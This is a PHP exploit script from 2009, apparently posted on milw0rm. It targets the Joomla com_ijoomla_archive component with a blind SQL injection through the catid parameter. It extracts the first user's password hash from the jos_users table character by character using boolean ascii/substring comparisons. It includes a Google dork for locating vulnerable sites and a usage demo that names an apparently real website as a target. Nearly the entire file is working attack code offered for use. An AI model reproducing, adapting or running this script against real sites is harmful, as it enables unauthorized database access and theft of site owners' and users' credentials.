<?php
/*
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+       Joomla com_ijoomla_archive Blind SQL Injection Exploit       +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
AUTHOR : Mountassif Moad
DATE   : 5 mars 2009
#####################################################
APPLICATION   : Joomla com_ijoomla_archive
DORK          : inurl:"com_ijoomla_archive"
#####################################################
 */

#
ini_set("max_execution_time",0);
print_r('
###############################################################
# com_ijoomla_archiv Blind SQL Injection Exploit 
# php '.$argv[0].' http://www.site.com/ real id
# Demo :
# php '.$argv[0].' http://thecatholicspirit.com/ 17
#                                                         
###############################################################
');
if ($argc > 1) {
$url = $argv[1];
if ($argc < 3) {
$userid = 1;
} else {
$userid = $argv[2];
}
$r = strlen(file_get_contents($url."/index.php?option=com_ijoomla_archive&task=archive&search_archive=1&act=search&catid=".$userid."+and+1=1"));
echo "\nExploiting:\n";
$w = strlen(file_get_contents($url."/index.php?option=com_ijoomla_archive&task=archive&search_archive=1&act=search&catid=".$userid."+and+1=0"));
$t = abs((100-($w/$r*100)));
echo "\nPassword: ";
for ($j = 1; $j <= 32; $j++) {
   for ($i = 46; $i <= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."/index.php?option=com_ijoomla_archive&task=archive&search_archive=1&act=search&catid=".$userid."+and+ascii(substring((select+password+from+jos_users+limit+0,1),".$j.",1))%3E".$i.""));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."/index.php?option=com_ijoomla_archive&task=archive&search_archive=1&act=search&catid=".$userid."+and+ascii(substring((select+password+from+jos_users+limit+0,1),".$j.",1))%3E".($i-1).""));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 102;
      }
   }
}
} else {
echo "\nExploiting failed: find another site\n";
}
?>

# milw0rm.com [2009-03-05]
